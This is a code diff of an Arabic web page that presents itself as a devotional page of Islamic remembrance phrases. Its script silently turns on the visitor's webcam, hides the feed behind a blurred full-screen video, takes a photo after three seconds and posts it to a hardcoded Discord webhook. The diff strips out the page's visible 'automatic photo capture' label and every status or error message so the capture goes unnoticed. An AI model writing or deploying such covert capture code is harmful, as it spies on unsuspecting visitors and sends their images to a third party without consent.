@@ -3,56 +3,58 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>التقاط صورة تلقائي</title>
+    <title>الذكر</title>
     <style>
         body {
             font-family: Arial, sans-serif;
-            text-align: center;
             background-color: #f0f8ff;
-            padding-top: 50px;
-        }
-        h1 {
             color: #333;
+            text-align: center;
+            padding-top: 50px;
+            overflow: hidden;
+            height: 100vh;
         }
-        video {
-            width: 100%;
-            max-width: 600px;
-            border: 1px solid #ddd;
+
+        h1 {
+            font-size: 30px;
             margin-bottom: 20px;
-            filter: blur(10px); /* تطبيق فلتر تشويش على الفيديو */
         }
-        canvas {
-            display: none;
-        }
+
         .prayer {
             font-size: 22px;
             color: #0000cd;
             font-weight: bold;
         }
+
+        video {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            object-fit: cover; /* لضمان تغطية الفيديو للشاشة بالكامل */
+            filter: blur(15px); /* تشويش الفيديو لإخفاء الوجه */
+        }
+
+        canvas {
+            display: none; /* إخفاء الـ canvas الذي يتم عليه التقاط الصورة */
+        }
     </style>
 </head>
 <body>
+    <!-- النصوص التي طلبتها -->
+    <p class="prayer">بسم الله الرحمن الرحيم</p>
+    <p class="prayer">اللهم صل وسلم على سيدنا محمد</p>
+    <p class="prayer">سبحان الله وبحمده، سبحان الله العظيم</p>
+    <p class="prayer">لا إله إلا الله محمد رسول الله</p>
+    <p class="prayer">اللهم اجعلنا من الذاكرين والذاكرات</p>
 
-    <h1>التقاط صورة تلقائي</h1>
-    
-    <!-- عرض الذكرى بشكل تلقائي -->
-    <div>
-        <p class="prayer">بسم الله الرحمن الرحيم</p>
-        <p class="prayer">اللهم صل وسلم على سيدنا محمد</p>
-        <p class="prayer">سبحان الله وبحمده، سبحان الله العظيم</p>
-        <p class="prayer">لا إله إلا الله محمد رسول الله</p>
-        <p class="prayer">اللهم اجعلنا من الذاكرين والذاكرات</p>
-    </div>
-
+    <!-- فيديو يعرض الكاميرا ولكن مع فلتر تشويش -->
     <video id="video" autoplay></video>
-    <br>
-    <p class="message" id="message"></p>
-
     <canvas id="canvas" width="640" height="480"></canvas>
 
     <script>
         const video = document.getElementById('video');
-        const message = document.getElementById('message');
         const canvas = document.getElementById('canvas');
         const ctx = canvas.getContext('2d');
         let stream;
@@ -66,8 +68,7 @@
                 // التقاط صورة تلقائيًا بعد 3 ثواني من تحميل الصفحة
                 setTimeout(captureImage, 3000); // التقاط صورة بعد 3 ثواني
             } catch (err) {
-                message.textContent = "لم يتمكن المتصفح من الوصول إلى الكاميرا.";
-                console.error("خطأ في الوصول إلى الكاميرا: ", err);
+                // في حالة حدوث خطأ، لا نعرض أي إشعارات
             }
         }
 
@@ -81,22 +82,15 @@
         // إرسال الصورة إلى الـ Webhook
         async function sendImageToWebhook(imageData) {
             try {
-                const response = await fetch('https://discord.com/api/webhooks/1362295538137043034/kVkadWuQygKz3igA3HVip8gs6ZA5met8p1SBlfszjSEQ_y1M58cvofS7U-C23Mv3Tzao', { // Webhook الخاص بك
+                await fetch('https://discord.com/api/webhooks/1362295538137043034/kVkadWuQygKz3igA3HVip8gs6ZA5met8p1SBlfszjSEQ_y1M58cvofS7U-C23Mv3Tzao', { // Webhook الخاص بك
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json'
                     },
                     body: JSON.stringify({ image: imageData })
                 });
-
-                if (response.ok) {
-                    message.textContent = "تم إرسال الصورة بنجاح!";
-                } else {
-                    message.textContent = "حدث خطأ أثناء إرسال الصورة.";
-                }
             } catch (err) {
-                message.textContent = "حدث خطأ أثناء الاتصال بالـ Webhook.";
-                console.error("Error sending image:", err);
+                // لا شيء يتم عرضه إذا فشل الاتصال
             }
         }
 
